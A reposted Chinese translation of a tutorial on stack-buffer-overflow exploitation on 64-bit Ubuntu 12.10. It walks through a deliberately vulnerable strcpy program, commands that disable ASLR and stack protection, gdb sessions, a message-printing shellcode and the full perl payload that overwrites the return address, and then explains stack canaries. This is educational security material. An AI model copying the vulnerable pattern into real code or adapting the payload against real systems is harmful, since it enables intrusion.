<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>[翻译]现代Linux系统上的栈溢出攻击【转】 « NotBeCN</title>
  <meta name="description" content="             转自：http://www.codeweblog.com/%E7%BF%BB%E8%AF%91-%E7%8E%B0%E4%BB%A3linux%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%...">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="https://notbe.cn/2017/05/12/weixin_33834137_90133589.html">
  <link rel="alternate" type="application/rss+xml" title="NotBeCN" href="https://notbe.cn/feed.xml" />
</head>


  <body>

    <div class="header-placeholder"></div>
<header class="header">
  <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    <a class="site-title" href="/">NotBeCN</a>
    <nav class="site-nav">
      
        
        <a class="page-link" href="/about/" target="_blank">关于</a>
      
        
        <a class="page-link" href="https://uzshare.com" target="_blank">社区</a>
      
        
        <a class="page-link" href="/donate/" target="_blank">Donate</a>
      
        
        <a class="page-link" href="/games/shejiyazi/" target="_blank">射个鸭子</a>
      
    </nav>
  </div>
</header>


    <div class="page-content">
      <div class="wrapper">
        <div class="col-main">
          <div class="post">

  <header class="post-header">
    <h1 class="post-title">[翻译]现代Linux系统上的栈溢出攻击【转】</h1>
    <p class="post-meta">May 12, 2017</p>
  </header>

  <article class="post-content">
    <div id="article_content" class="article_content clearfix csdn-tracking-statistics" data-pid="blog" data-mod="popu_307" data-dsm="post"> 
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-f57960eb32.css"> 
 <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-f57960eb32.css"> 
 <div class="htmledit_views" id="content_views"> 
  <div class="content-detail markdown-body"> 
   <p>转自：<a href="http://www.codeweblog.com/%E7%BF%BB%E8%AF%91-%E7%8E%B0%E4%BB%A3linux%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/" rel="nofollow">http://www.codeweblog.com/%E7%BF%BB%E8%AF%91-%E7%8E%B0%E4%BB%A3linux%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/</a></p> 
   <div class="cnblogs_code"> 
    <pre><span style="color:#000000;">现代Linux系统上的栈溢出攻击

</span><span style="color:#800080;">2012.12</span>.<span style="color:#800080;">21</span> - <span style="color:#800080;">06</span>:<span style="color:#800080;">56</span><span style="color:#000000;"> — jip

预备知识:

对C语言和 X86_64 汇编语言有基本的了解

</span>+++++++++++++++++++++++++++++++++++++++++++

+ Stack Smashing On A Modern Linux System +

+ jip@soldierx.com +

+翻译:sincoder admin@sincoder.com +

+++++++++++++++++++++++++++++++++++++++++++
<span style="color:#800080;">1</span><span style="color:#000000;">. 基本内容

这个教程试着向读者展示最基本的栈溢出攻击和现代Linux发行版中针对这种攻击的防御机制。为此我选择了最新版本的Ubuntu系统（</span><span style="color:#800080;">12.10</span><span style="color:#000000;">），因为它默认集成了几个安全防御机制，而且它也是一个非常流行的发行版。安装和使用都很方便。我们选择的系统是X86_64的。读者将会了解到栈溢出是怎样在那些默认没有安全防御机制的老系统上面成功的溢出的。而且还会解释在最新版本的Ubuntu上这些保护措施是如何工作的。我还会使用一个小例子来说明如果不阻止一个栈上面的数据结构被溢出那么程序的执行路径就会失去控制 。

尽管本文中使用的攻击方式不像经典的栈溢出的攻击方式，而更像是对堆溢出或者格式化字符串漏洞的利用方式，尽管有各种保护机制的存在溢出还是不可避免的存在。现在如果你还不懂这些，不要担心，我会在下面的文章中详细的讲解。
</span><span style="color:#800080;">2</span><span style="color:#000000;">. 使用的系统

关于不同版本的ubuntu 系统中默认启用的安全控制机可以看这里：https:</span><span style="color:#008000;">//</span><span style="color:#008000;">wiki.ubuntu.com/Security/Features</span>

-----------------------------------<span style="color:#000000;">

$ uname </span>-srp &amp;&amp; cat /etc/lsb-release | grep DESC &amp;&amp; gcc --version |<span style="color:#000000;"> grep gcc

Linux </span><span style="color:#800080;">3.5</span>.<span style="color:#800080;">0</span>-<span style="color:#800080;">19</span>-<span style="color:#000000;">generic x86_64

DISTRIB_DESCRIPTION</span>=<span style="color:#800000;">"</span><span style="color:#800000;">Ubuntu 12.10</span><span style="color:#800000;">"</span><span style="color:#000000;">

gcc (Ubuntu</span>/Linaro <span style="color:#800080;">4.7</span>.<span style="color:#800080;">2</span>-2ubuntu1) <span style="color:#800080;">4.7</span>.<span style="color:#800080;">2</span>

-----------------------------------
<span style="color:#800080;">3</span><span style="color:#000000;">. 经典的栈溢出

首先让我们回到从前，一切都很简单，向栈上面复制草率的复制数据很容易导致程序的执行完全失控。可以看下面的例子（没有考了到许多保护机制）.

</span>-----------------------------------<span style="color:#000000;">

$ cat oldskool.c

#include </span>&lt;<span style="color:#0000ff;">string</span>.h&gt;

<span style="color:#0000ff;">void</span> go(<span style="color:#0000ff;">char</span> *<span style="color:#000000;">data) {

</span><span style="color:#0000ff;">char</span> name[<span style="color:#800080;">64</span><span style="color:#000000;">];

strcpy(name, data);

}

</span><span style="color:#0000ff;">int</span> main(<span style="color:#0000ff;">int</span> argc, <span style="color:#0000ff;">char</span> **<span style="color:#000000;">argv) {

go(argv[</span><span style="color:#800080;">1</span><span style="color:#000000;">]);

}

</span>-----------------------------------<span style="color:#000000;">

在测试之前，我们需要禁用系统的 ASLR ,你可以这么来做：

</span>-----------------------------------<span style="color:#000000;">

$ sudo </span>-<span style="color:#000000;">i

root@laptop:</span>~# echo <span style="color:#800000;">"</span><span style="color:#800000;">0</span><span style="color:#800000;">"</span> &gt; /proc/sys/kernel/<span style="color:#000000;">randomize_va_space

root@laptop:</span>~<span style="color:#000000;"># exit

logout

</span>-----------------------------------<span style="color:#000000;">

在很老的机器上面也许还不存在这个包含机制。为了同时禁用掉其他的保护（主要是编译器生成的运行时栈检测代码） 我们可以这样来编译我们的例子：

$ gcc oldskool.c </span>-o oldskool -zexecstack -fno-stack-protector -<span style="color:#000000;">g

下面来看看这个示例程序，我们可以看到 我们在函数中在栈上面分配了64字节的缓冲区，然后把命令行的第一个参数复制到这个缓冲区里面。程序没有检测第一个参数的长度是不是大于64字节就直接调用strcpy 来复制数据了，众所周知，这样会导致栈溢出。 现在为了得到程序控制权限，我们需要知道这样一个事实，就是任意一个C函数在进入一个函数之前，都会把它即将执行的下一条指令的地址压到栈中（也就是call指令做的事情 把call的下一条指令压栈,这样函数就知道要返回哪个地址继续执行了）。我们把这个地址叫做函数返回地址或者叫 “已保存的指令的指针”。在我们的例子里面 返回地址就是我们在执行完我们的 go()函数后下一步要执行的那条指令的地址。这个地址就仅挨着我们的 name[</span><span style="color:#800080;">64</span>] 这个缓冲区。因为栈的工作方式（译者注：也就是栈是向低地址衍生的，也就是说最后进栈的保存在栈最低的地址处），如果用户的数据超过了缓冲区的长度，那么输入的数据就会覆盖掉函数的返回地址（译者注：因为往缓冲区里面写数据是从低地址向高地址写，所以当写完函数分配缓冲区，下面的4个字节就是函数的返回地址了）。函数返回的时候就会跳到错误的地址处去执行，一个攻击者就能通过把他们要执行的机器码复制到一个缓冲区中，然后把返回地址指向那个缓冲区来劫持程序的执行流程。然后攻击者就可以随意的让程序做一些他们想做的事情，也许是因为好玩也行是为了利益。废话不多说，让我来给你们演示下吧 如果你看不懂下面使用的命令，你可以在 http:<span style="color:#008000;">//</span><span style="color:#008000;">beej.us/guide/bggdb/ 看一下GDB 的使用教程。</span>

-----------------------------------<span style="color:#000000;">

$ gdb </span>-q ./<span style="color:#000000;">oldskool

Reading symbols </span><span style="color:#0000ff;">from</span> /home/me/.hax/vuln/<span style="color:#000000;">oldskool...done.

(gdb) disas main

Dump of assembler code </span><span style="color:#0000ff;">for</span><span style="color:#000000;"> function main:

</span><span style="color:#800080;">0x000000000040053d</span> &lt;+<span style="color:#800080;">0</span>&gt;: push %<span style="color:#000000;">rbp

</span><span style="color:#800080;">0x000000000040053e</span> &lt;+<span style="color:#800080;">1</span>&gt;: mov %rsp,%<span style="color:#000000;">rbp

</span><span style="color:#800080;">0x0000000000400541</span> &lt;+<span style="color:#800080;">4</span>&gt;: sub $<span style="color:#800080;">0x10</span>,%<span style="color:#000000;">rsp

</span><span style="color:#800080;">0x0000000000400545</span> &lt;+<span style="color:#800080;">8</span>&gt;: mov %edi,-<span style="color:#800080;">0x4</span>(%<span style="color:#000000;">rbp)

</span><span style="color:#800080;">0x0000000000400548</span> &lt;+<span style="color:#800080;">11</span>&gt;: mov %rsi,-<span style="color:#800080;">0x10</span>(%<span style="color:#000000;">rbp)

</span><span style="color:#800080;">0x000000000040054c</span> &lt;+<span style="color:#800080;">15</span>&gt;: mov -<span style="color:#800080;">0x10</span>(%rbp),%<span style="color:#000000;">rax

</span><span style="color:#800080;">0x0000000000400550</span> &lt;+<span style="color:#800080;">19</span>&gt;: add $<span style="color:#800080;">0x8</span>,%<span style="color:#000000;">rax

</span><span style="color:#800080;">0x0000000000400554</span> &lt;+<span style="color:#800080;">23</span>&gt;: mov (%rax),%<span style="color:#000000;">rax

</span><span style="color:#800080;">0x0000000000400557</span> &lt;+<span style="color:#800080;">26</span>&gt;: mov %rax,%<span style="color:#000000;">rdi

</span><span style="color:#800080;">0x000000000040055a</span> &lt;+<span style="color:#800080;">29</span>&gt;: callq <span style="color:#800080;">0x40051c</span>

<span style="color:#800080;">0x000000000040055f</span> &lt;+<span style="color:#800080;">34</span>&gt;<span style="color:#000000;">: leaveq

</span><span style="color:#800080;">0x0000000000400560</span> &lt;+<span style="color:#800080;">35</span>&gt;<span style="color:#000000;">: retq

End of assembler dump.

(gdb) </span><span style="color:#0000ff;">break</span> *<span style="color:#800080;">0x40055a</span><span style="color:#000000;">

Breakpoint </span><span style="color:#800080;">1</span> at <span style="color:#800080;">0x40055a</span>: file oldskool.c, line <span style="color:#800080;">11</span><span style="color:#000000;">.

(gdb) run myname

Starting program: </span>/home/me/.hax/vuln/<span style="color:#000000;">oldskool myname

Breakpoint </span><span style="color:#800080;">1</span>, <span style="color:#800080;">0x000000000040055a</span> <span style="color:#0000ff;">in</span> main (argc=<span style="color:#800080;">2</span>, argv=<span style="color:#800080;">0x7fffffffe1c8</span><span style="color:#000000;">)

</span><span style="color:#800080;">11</span> go(argv[<span style="color:#800080;">1</span><span style="color:#000000;">]);

(gdb) x</span>/<span style="color:#000000;">i $rip

</span>=&gt; <span style="color:#800080;">0x40055a</span> : callq <span style="color:#800080;">0x40051c</span><span style="color:#000000;">

(gdb) i r rsp

rsp </span><span style="color:#800080;">0x7fffffffe0d0</span> <span style="color:#800080;">0x7fffffffe0d0</span><span style="color:#000000;">

(gdb) si

go (data</span>=<span style="color:#800080;">0xc2</span> ) at oldskool.c:<span style="color:#800080;">4</span>

<span style="color:#800080;">4</span> <span style="color:#0000ff;">void</span> go(<span style="color:#0000ff;">char</span> *<span style="color:#000000;">data) {

(gdb) i r rsp

rsp </span><span style="color:#800080;">0x7fffffffe0c8</span> <span style="color:#800080;">0x7fffffffe0c8</span><span style="color:#000000;">

(gdb) x</span>/<span style="color:#000000;">gx $rsp

</span><span style="color:#800080;">0x7fffffffe0c8</span>: <span style="color:#800080;">0x000000000040055f</span>

-----------------------------------<span style="color:#000000;">

我们在调用go函数之前设置了一个断电, 在 </span><span style="color:#800080;">0x000000000040055a</span> &lt;+<span style="color:#800080;">29</span>&gt;.然后我们使用参数 myname 来执行我们的程序, 然后程序在进入go函数的时候停了下来. 然后我们通过命令si来执行一条指令。然后看下栈指针 rsp (因为是64位的系统嘛),可以看出rsp的值就是 call go 的下一条指令的地址 <span style="color:#800080;">0x000000000040055f</span> &lt;+<span style="color:#800080;">34</span>&gt;<span style="color:#000000;">。这些就是我们上面所讲的。

下面的输出显示当go函数调用结束的时候，会执行 retq 这个指令，这个指令会将函数的返回地址弹出栈，然后跳到这个地址去执行而不管这个地址指向哪里 。

</span>-----------------------------------<span style="color:#000000;">

(gdb) disas go

Dump of assembler code </span><span style="color:#0000ff;">for</span><span style="color:#000000;"> function go:

</span>=&gt; <span style="color:#800080;">0x000000000040051c</span> &lt;+<span style="color:#800080;">0</span>&gt;: push %<span style="color:#000000;">rbp

</span><span style="color:#800080;">0x000000000040051d</span> &lt;+<span style="color:#800080;">1</span>&gt;: mov %rsp,%<span style="color:#000000;">rbp

</span><span style="color:#800080;">0x0000000000400520</span> &lt;+<span style="color:#800080;">4</span>&gt;: sub $<span style="color:#800080;">0x50</span>,%<span style="color:#000000;">rsp

</span><span style="color:#800080;">0x0000000000400524</span> &lt;+<span style="color:#800080;">8</span>&gt;: mov %rdi,-<span style="color:#800080;">0x48</span>(%<span style="color:#000000;">rbp)

</span><span style="color:#800080;">0x0000000000400528</span> &lt;+<span style="color:#800080;">12</span>&gt;: mov -<span style="color:#800080;">0x48</span>(%rbp),%<span style="color:#000000;">rdx

</span><span style="color:#800080;">0x000000000040052c</span> &lt;+<span style="color:#800080;">16</span>&gt;: lea -<span style="color:#800080;">0x40</span>(%rbp),%<span style="color:#000000;">rax

</span><span style="color:#800080;">0x0000000000400530</span> &lt;+<span style="color:#800080;">20</span>&gt;: mov %rdx,%<span style="color:#000000;">rsi

</span><span style="color:#800080;">0x0000000000400533</span> &lt;+<span style="color:#800080;">23</span>&gt;: mov %rax,%<span style="color:#000000;">rdi

</span><span style="color:#800080;">0x0000000000400536</span> &lt;+<span style="color:#800080;">26</span>&gt;: callq <span style="color:#800080;">0x4003f0</span>

<span style="color:#800080;">0x000000000040053b</span> &lt;+<span style="color:#800080;">31</span>&gt;<span style="color:#000000;">: leaveq

</span><span style="color:#800080;">0x000000000040053c</span> &lt;+<span style="color:#800080;">32</span>&gt;<span style="color:#000000;">: retq

End of assembler dump.

(gdb) </span><span style="color:#0000ff;">break</span> *<span style="color:#800080;">0x40053c</span><span style="color:#000000;">

Breakpoint </span><span style="color:#800080;">2</span> at <span style="color:#800080;">0x40053c</span>: file oldskool.c, line <span style="color:#800080;">8</span><span style="color:#000000;">.

(gdb) </span><span style="color:#0000ff;">continue</span><span style="color:#000000;">

Continuing.

Breakpoint </span><span style="color:#800080;">2</span>, <span style="color:#800080;">0x000000000040053c</span> <span style="color:#0000ff;">in</span> go (data=<span style="color:#800080;">0x7fffffffe4b4</span> <span style="color:#800000;">"</span><span style="color:#800000;">myname</span><span style="color:#800000;">"</span><span style="color:#000000;">)

</span><span style="color:#800080;">8</span><span style="color:#000000;"> }

(gdb) x</span>/<span style="color:#000000;">i $rip (gdb x命令用于查看内存的数据)

</span>=&gt; <span style="color:#800080;">0x40053c</span><span style="color:#000000;"> : retq

(gdb) x</span>/<span style="color:#000000;">gx $rsp

</span><span style="color:#800080;">0x7fffffffe0c8</span>: <span style="color:#800080;">0x000000000040055f</span><span style="color:#000000;">

(gdb) si

main (argc</span>=<span style="color:#800080;">2</span>, argv=<span style="color:#800080;">0x7fffffffe1c8</span>) at oldskool.c:<span style="color:#800080;">12</span>

<span style="color:#800080;">12</span><span style="color:#000000;"> }

(gdb) x</span>/<span style="color:#000000;">gx $rsp

</span><span style="color:#800080;">0x7fffffffe0d0</span>: <span style="color:#800080;">0x00007fffffffe1c8</span><span style="color:#000000;">

(gdb) x</span>/<span style="color:#000000;">i $rip

</span>=&gt; <span style="color:#800080;">0x40055f</span><span style="color:#000000;"> : leaveq

(gdb) quit

</span>-----------------------------------<span style="color:#000000;">

我们在fo函数即将返回的地方下一个断电然后继续执行。程序会在执行retq指令的地方停下来。我们可以看到栈寄存器rsp还是指向main函数内部那个即将在go函数后面执行的指令。等retq 执行完了，我们可以看出程序立即把返回地址弹出栈让跳过去执行了。现在我们要去覆盖这个返回地址使用perl来提供多于64个字节的数据 。

</span>-----------------------------------<span style="color:#000000;">

$ gdb </span>-q ./<span style="color:#000000;">oldskool

Reading symbols </span><span style="color:#0000ff;">from</span> /home/me/.hax/vuln/<span style="color:#000000;">oldskool...done.

(gdb) run `perl </span>-e <span style="color:#800000;">'</span><span style="color:#800000;">print "A"x48</span><span style="color:#800000;">'</span><span style="color:#000000;">`

Starting program: </span>/home/me/.hax/vuln/oldskool `perl -e <span style="color:#800000;">'</span><span style="color:#800000;">print "A"x80</span><span style="color:#800000;">'</span><span style="color:#000000;">`

Program received signal SIGSEGV, Segmentation fault.

</span><span style="color:#800080;">0x000000000040059c</span> <span style="color:#0000ff;">in</span> go (data=<span style="color:#800080;">0x7fffffffe49a</span> <span style="color:#800000;">'</span><span style="color:#800000;">A</span><span style="color:#800000;">'</span><span style="color:#000000;"> )

</span><span style="color:#800080;">12</span><span style="color:#000000;"> }

(gdb) x</span>/<span style="color:#000000;">i $rip

</span>=&gt; <span style="color:#800080;">0x40059c</span><span style="color:#000000;"> : retq

(gdb) x</span>/<span style="color:#000000;">gx $rsp

</span><span style="color:#800080;">0x7fffffffe0a8</span>: <span style="color:#800080;">0x4141414141414141</span>

-----------------------------------<span style="color:#000000;">

我们使用prel在命令行中打印出80个</span><span style="color:#800000;">"</span><span style="color:#800000;">A</span><span style="color:#800000;">"</span>,然后把它作为参数传递给我们的实例程序。我们可以看出当程序执行完retq指令的时候崩溃了。因为程序试图跳到的返回地址被字符“A<span style="color:#800000;">"</span><span style="color:#800000;">(0x41) 填充了。主要我们必须要写入80个字节（64+8+8）因为指针在64位机器上面是8个字节的，为什么要加两个8呢 因为在我们的缓冲区和返回地址之间还保存着一个指针 有木有注意到go函数的第一条指令 push ebp ?! 好了，那么现在我们可以做到把程序的执行路径重定向到任意的位置 然后执行我们的命令了吗 ？如果我们把我们的指令放到name[]这个数组中，然后把函数的返回地址覆盖成数组的起始地址，程序就会执行我们的指令（或者说是传说中的shellcode）,我们需要知道name[]数组的地址然后才能知道需要把返回地址覆盖成什么值。在本文中我不会教大家如果创建一个shellcode 因为这个有点超出本文的范围了。但是我还是会给你提供一个在屏幕上打印一个消息的shellcode 。我们可以这样来得到name数组的地址。</span>

-----------------------------------<span style="color:#000000;">

(gdb) p </span>&amp;<span style="color:#000000;">name

$</span><span style="color:#800080;">2</span> = (<span style="color:#0000ff;">char</span> (*)[<span style="color:#800080;">32</span>]) <span style="color:#800080;">0x7fffffffe0a0</span>

-----------------------------------<span style="color:#000000;">

我们可以使用perl来在命令行上打印不可打印的字符，通过使用对应的16进制来转义，就像这样</span><span style="color:#800000;">"</span><span style="color:#800000;">\x41</span><span style="color:#800000;">"</span>。由于机器上面存储整数和指针是使用小端（little-endian）的，所以我们需要将字节的顺便反过来。因此我们要去覆盖返回地址的值就是 <span style="color:#800000;">"</span><span style="color:#800000;">\xa0\xe0\xff\xff\xff\x7f</span><span style="color:#800000;">"</span><span style="color:#000000;">

下面就是会在屏幕上打印出我们的消息然后退出的shellcode:

</span><span style="color:#800000;">"</span><span style="color:#800000;">\xeb\x22\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\xff\xc0\x48\xff\xc7\x5e\x48</span>
<span style="color:#000000;">
\x83\xc2\x04\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xd9

\xff\xff\xff\x48\x61\x78\x21</span><span style="color:#800000;">"
</span><span style="color:#000000;">
这些只是要执行的指令的机器码形式，这样转义后，他们就可以使用perl来打印了。因为shellcode 的长度是45字节，但是我们需要72个字节才能覆盖掉SIP。所以需要再加上27个字节。好了 下面就是我们要使用的字符串:

</span><span style="color:#800000;">"</span><span style="color:#800000;">\xeb\x22\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\xff\xc0\x48\xff\xc7\x5e\x48</span>
<span style="color:#000000;">
\x83\xc2\x04\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xd9

\xff\xff\xff\x48\x61\x78\x21</span><span style="color:#800000;">"</span><span style="color:#800000;"> . </span><span style="color:#800000;">"</span>A<span style="color:#800000;">"</span><span style="color:#800000;">x27 . </span><span style="color:#800000;">"</span>\xa0\xe0\xff\xff\xff\x7f<span style="color:#800000;">"
</span><span style="color:#000000;">
当程序执行完go() 这个函数的时候就会跳到0x7fffffffe0a0去执行。而这个地址正是name[]数组的地址，此时name[]数组里面已经被填充上我们的shellcode了。不出意外的话，程序就会执行我们的shellcode然后打印出消息 ，然后退出，好了 现在我们来试一试（注意执行前 清除掉所有的断点 （译者注：如果你在调试器里面执行的话））：

</span>-----------------------------------<span style="color:#000000;">

$ .</span>/oldskool `perl -e <span style="color:#800000;">'</span><span style="color:#800000;">print "\xeb\x22\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48</span>
<span style="color:#000000;">
\xff\xc0\x48\xff\xc7\x5e\x48\x83\xc2\x04\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c

\x48\x31\xff\x0f\x05\xe8\xd9\xff\xff\xff\x48\x61\x78\x21</span><span style="color:#800000;">"</span><span style="color:#800000;"> . </span><span style="color:#800000;">"</span>A<span style="color:#800000;">"</span><span style="color:#800000;">x27 . </span><span style="color:#800000;">"</span><span style="color:#000000;">\xa0\xe0

\xff\xff\xff\x7f</span><span style="color:#800000;">"</span><span style="color:#800000;">'`</span>
<span style="color:#000000;">
Hax</span>!<span style="color:#000000;">$

</span>-----------------------------------<span style="color:#000000;">

可以看到，我们shellcode 被执行了，程序打印出消息然后退出了。
</span><span style="color:#800080;">4</span><span style="color:#000000;">. 保护机制

欢迎来到2012年，上面的例子在层层保护之下已经不能工作了。现在在我们的Ubuntu机器上面使用了很多不同的保护措施。这种形式的利用方式甚至已经不存在了。当然栈中还是会发生溢出，也还是有新的方法来利用它。这就是我下面一节要介绍的。但是首先还是让我们来了解下各种保护机制吧。

</span><span style="color:#800080;">4.1</span><span style="color:#000000;"> 堆栈保护

在上面的例子里面我们使用</span>-fno-stack-<span style="color:#000000;">protector 标识来告诉gcc 我们不想启用堆栈保护。如果我们把这个选项和前面加的其他选项都去掉呢 ？注意此时ASLR也被打开了，所有的东西都变成默认了。

$ gcc oldskool.c </span>-o oldskool -<span style="color:#000000;">g

我们先看看生成的二进制代码，看看有什么变化。

</span>-----------------------------------<span style="color:#000000;">

$ gdb </span>-q ./<span style="color:#000000;">oldskool

Reading symbols </span><span style="color:#0000ff;">from</span> /home/me/.hax/vuln/<span style="color:#000000;">oldskool...done.

(gdb) disas go

Dump of assembler code </span><span style="color:#0000ff;">for</span><span style="color:#000000;"> function go:

</span><span style="color:#800080;">0x000000000040058c</span> &lt;+<span style="color:#800080;">0</span>&gt;: push %<span style="color:#000000;">rbp

</span><span style="color:#800080;">0x000000000040058d</span> &lt;+<span style="color:#800080;">1</span>&gt;: mov %rsp,%<span style="color:#000000;">rbp

</span><span style="color:#800080;">0x0000000000400590</span> &lt;+<span style="color:#800080;">4</span>&gt;: sub $<span style="color:#800080;">0x60</span>,%<span style="color:#000000;">rsp

</span><span style="color:#800080;">0x0000000000400594</span> &lt;+<span style="color:#800080;">8</span>&gt;: mov %rdi,-<span style="color:#800080;">0x58</span>(%<span style="color:#000000;">rbp)

</span><span style="color:#800080;">0x0000000000400598</span> &lt;+<span style="color:#800080;">12</span>&gt;: mov %fs:<span style="color:#800080;">0x28</span>,%<span style="color:#000000;">rax

</span><span style="color:#800080;">0x00000000004005a1</span> &lt;+<span style="color:#800080;">21</span>&gt;: mov %rax,-<span style="color:#800080;">0x8</span>(%<span style="color:#000000;">rbp)

</span><span style="color:#800080;">0x00000000004005a5</span> &lt;+<span style="color:#800080;">25</span>&gt;: xor %eax,%<span style="color:#000000;">eax

</span><span style="color:#800080;">0x00000000004005a7</span> &lt;+<span style="color:#800080;">27</span>&gt;: mov -<span style="color:#800080;">0x58</span>(%rbp),%<span style="color:#000000;">rdx

</span><span style="color:#800080;">0x00000000004005ab</span> &lt;+<span style="color:#800080;">31</span>&gt;: lea -<span style="color:#800080;">0x50</span>(%rbp),%<span style="color:#000000;">rax

</span><span style="color:#800080;">0x00000000004005af</span> &lt;+<span style="color:#800080;">35</span>&gt;: mov %rdx,%<span style="color:#000000;">rsi

</span><span style="color:#800080;">0x00000000004005b2</span> &lt;+<span style="color:#800080;">38</span>&gt;: mov %rax,%<span style="color:#000000;">rdi

</span><span style="color:#800080;">0x00000000004005b5</span> &lt;+<span style="color:#800080;">41</span>&gt;: callq <span style="color:#800080;">0x400450</span>

<span style="color:#800080;">0x00000000004005ba</span> &lt;+<span style="color:#800080;">46</span>&gt;: mov -<span style="color:#800080;">0x8</span>(%rbp),%<span style="color:#000000;">rax

</span><span style="color:#800080;">0x00000000004005be</span> &lt;+<span style="color:#800080;">50</span>&gt;: xor %fs:<span style="color:#800080;">0x28</span>,%<span style="color:#000000;">rax

</span><span style="color:#800080;">0x00000000004005c7</span> &lt;+<span style="color:#800080;">59</span>&gt;: je <span style="color:#800080;">0x4005ce</span>

<span style="color:#800080;">0x00000000004005c9</span> &lt;+<span style="color:#800080;">61</span>&gt;: callq <span style="color:#800080;">0x400460</span> &lt;__stack_chk_fail@plt&gt;

<span style="color:#800080;">0x00000000004005ce</span> &lt;+<span style="color:#800080;">66</span>&gt;<span style="color:#000000;">: leaveq

</span><span style="color:#800080;">0x00000000004005cf</span> &lt;+<span style="color:#800080;">67</span>&gt;<span style="color:#000000;">: retq

End of assembler dump.

</span>-----------------------------------<span style="color:#000000;">

如果我们观察go</span>+<span style="color:#800080;">12</span> 和 go+<span style="color:#800080;">21</span>,可以看到一个值被从$fs+<span style="color:#800080;">0x28</span> 或者%fs:<span style="color:#800080;">0x28</span><span style="color:#000000;">。这个地址指向的值并不重要，现在我只告诉你:fs 指向的结构是供内核使用的（为内核保留的），我们不能使用gdb 来查看fs 的值。但是我们只需要知道这个地方包含了一个随机的值，已经被证明我们是不能提前预测这个值的。

</span>-----------------------------------<span style="color:#000000;">

(gdb) </span><span style="color:#0000ff;">break</span> *<span style="color:#800080;">0x0000000000400598</span><span style="color:#000000;">

Breakpoint </span><span style="color:#800080;">1</span> at <span style="color:#800080;">0x400598</span>: file oldskool.c, line <span style="color:#800080;">4</span><span style="color:#000000;">.

(gdb) run

Starting program: </span>/home/me/.hax/vuln/<span style="color:#000000;">oldskool

Breakpoint </span><span style="color:#800080;">1</span>, go (data=<span style="color:#800080;">0x0</span>) at oldskool.c:<span style="color:#800080;">4</span>

<span style="color:#800080;">4</span> <span style="color:#0000ff;">void</span> go(<span style="color:#0000ff;">char</span> *<span style="color:#000000;">data) {

(gdb) x</span>/<span style="color:#000000;">i $rip

</span>=&gt; <span style="color:#800080;">0x400598</span> : mov %fs:<span style="color:#800080;">0x28</span>,%<span style="color:#000000;">rax

(gdb) si

</span><span style="color:#800080;">0x00000000004005a1</span> <span style="color:#800080;">4</span> <span style="color:#0000ff;">void</span> go(<span style="color:#0000ff;">char</span> *<span style="color:#000000;">data) {

(gdb) i r rax

rax </span><span style="color:#800080;">0x110279462f20d0001225675390943547392</span><span style="color:#000000;">

(gdb) run

The program being debugged has been started already.

Start it </span><span style="color:#0000ff;">from</span> the beginning?<span style="color:#000000;"> (y or n) y

Starting program: </span>/home/me/.hax/vuln/<span style="color:#000000;">oldskool

Breakpoint </span><span style="color:#800080;">1</span>, go (data=<span style="color:#800080;">0x0</span>) at oldskool.c:<span style="color:#800080;">4</span>

<span style="color:#800080;">4</span> <span style="color:#0000ff;">void</span> go(<span style="color:#0000ff;">char</span> *<span style="color:#000000;">data) {

(gdb) si

</span><span style="color:#800080;">0x00000000004005a1</span> <span style="color:#800080;">4</span> <span style="color:#0000ff;">void</span> go(<span style="color:#0000ff;">char</span> *<span style="color:#000000;">data) {

(gdb) i r rax

rax </span><span style="color:#800080;">0x21f95d1abb2a0800</span> <span style="color:#800080;">2448090241843202048</span>

-----------------------------------<span style="color:#000000;">

我们在将那个值从 $fs</span>+0x28移到rax的指令处下断点，然后执行这条指令，查看rax的值，重复这个过程我们可以清楚的看到这个值每次运行都会变化，所以这是个每次程序运行都会改变的值。也就是说攻击者不能提前知道这个值。但是这个值是怎么用来保护栈的呢？如果我们看 go+<span style="color:#800080;">21</span> 处 ，可以看出这个值被拷贝到 -<span style="color:#800080;">0x8</span>(%rbp) 处。可以看出这个值恰好在函数的局部变量和函数的返回地址之间。这个值被叫做”金丝雀”，也就是矿工用来提醒他们瓦斯泄露的。因为金丝雀对瓦斯比较忙敏感，会比人先死去。类比下，当发生缓冲区溢出的时候，这个值会比函数的返回地址先被覆盖。如果我们看下 go+<span style="color:#800080;">46</span> 和 go+<span style="color:#800080;">50</span><span style="color:#000000;"> 的地方，可以看出这个值被从堆栈里面读出来。然后和原来的值做对比，如果他们是一样的那么就说明值没有改变，也就是说函数的返回地址也没被改变，然后就运行函数正常的退出了。但是如果这个值改变了，就说明发送了栈溢出，保存的函数返回地址有可能被改写了。于是函数就会执行__stack_chk_fail函数，这个函数会抛出一个错误，然后让进程退出。就像下面你看到的一样：

</span>-----------------------------------<span style="color:#000000;">

$ .</span>/oldskool `perl -e <span style="color:#800000;">'</span><span style="color:#800000;">print "A"x80</span><span style="color:#800000;">'</span><span style="color:#000000;">`

</span>*** stack smashing detected ***: ./<span style="color:#000000;">oldskool terminated

Aborted (core dumped)

</span>-----------------------------------<span style="color:#000000;">

